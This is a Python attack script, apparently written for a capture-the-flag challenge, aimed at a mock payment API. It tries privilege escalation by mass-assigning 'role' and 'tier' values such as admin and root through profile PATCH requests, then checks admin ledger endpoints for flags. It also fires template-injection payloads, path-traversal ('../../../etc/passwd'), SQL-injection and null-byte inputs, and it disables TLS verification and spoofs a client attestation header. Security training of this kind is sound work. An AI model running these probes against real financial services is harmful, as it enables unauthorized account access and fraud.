import json, ssl, urllib.request, urllib.error, re, time
BASE = "https://web-3f25599ac74e8a91.web.h7tex.com"
CTX = ssl.create_default_context(); CTX.check_hostname=False; CTX.verify_mode=ssl.CERT_NONE
CL = "MeridianPay-Android/3.2.1 (attested)"
def raw(p, m="GET", b=None, t=None):
    h = {"Content-Type":"application/json","X-Meridian-Client":CL}
    if t: h["Authorization"] = "Bearer " + t
    d = json.dumps(b).encode() if b is not None else None
    r = urllib.request.Request(BASE+p, data=d, method=m, headers=h)
    try:
        with urllib.request.urlopen(r, context=CTX, timeout=10) as f: return f.status, f.read().decode("utf-8","replace")
    except urllib.error.HTTPError as e: return e.code, e.read().decode("utf-8","replace")
    except Exception as e: return None, repr(e)

_, t = raw("/api/v1/auth/device","POST",{"device_id":"v3"}); T = json.loads(t)["token"]
GETS = ["/api/v1/admin/ledger", "/api/v1/accounts/me", "/api/v1/internal/promo", "/api/v1/promo/public"]

def scan(tag):
    for g in GETS:
        c, b = raw(g, t=T)
        keys = ""
        try: keys = ",".join(sorted(_k(json.loads(b))))
        except Exception: pass
        flags = re.findall(r"H7CTF\{[^}]+\}", b)
        extra = [k for k in ("49","H7CTF","secret","master","key","flag") if k in b and g != "/api/v1/admin/ledger"]
        print(f"  [{tag}] {g} {c} keys={keys} flags={flags}")

def _k(o):
    if isinstance(o, dict):
        for k, v in o.items():
            yield k
            yield from _k(v)

ROLES = ["customer","staff","auditor","support","compliance","corporate","system","root","service",
         "internal","superadmin","owner","operator","admin","administrator","agent","manager","risk",
         "kyc","dev","debug","maintenance","robot","machine","backend","gateway","partner","merchant"]
print("== role sweep (ledger/accounts field sets) ==")
seen = {}
for role in ROLES:
    raw("/api/v1/profile","PATCH",{"role":role},T)
    c, led = raw("/api/v1/admin/ledger", t=T)
    c2, acc = raw("/api/v1/accounts/me", t=T)
    sig = (c, len(led), c2, len(acc))
    if sig not in seen.values() or True:
        print(f"  role={role:14s} ledger={c} len={len(led)} acct={c2} len={len(acc)} {led[:90].strip()}")
    seen[role] = sig

TIERS = ["standard","premium","corporate","business","platinum","vip","internal","admin","enterprise",
         "staff","system","root","private","secret","black"]
print("\n== tier sweep ==")
for tier in TIERS:
    raw("/api/v1/profile","PATCH",{"tier":tier,"role":"admin"},T)
    for g in GETS[:3]:
        c, b = raw(g, t=T)
        fl = re.findall(r"H7CTF\{[^}]+\}", b)
        print(f"  tier={tier:10s} {g} {c} len={len(b)} flags={fl}")

print("\n== SSTI / injection via profile fields ==")
for payload in ["{{7*7}}", "${7*7}", "#{7*7}", "<%= 7*7 %>", "{7*7}", "9*7", "{{config}}", "{{''.__class__}}"]:
    raw("/api/v1/profile","PATCH",{"name":payload,"email":payload,"tier":payload},T)
    print(f" payload={payload}")
    scan("ssti")
raw("/api/v1/profile","PATCH",{"role":"admin","tier":"premium","name":"Alicia Reyes","email":"alicia.reyes@meridianpay.io"},T)
print("\n== device_id injection ==")
for dv in ["{{7*7}}", "../../../etc/passwd", "%00", "' or 1=1--", "and-"+"0"*36, "1000", "admin", ""]:
    c, b = raw("/api/v1/auth/device","POST",{"device_id":dv})
    print(f"  device_id={dv!r} -> {c} {b[:120].strip()}")
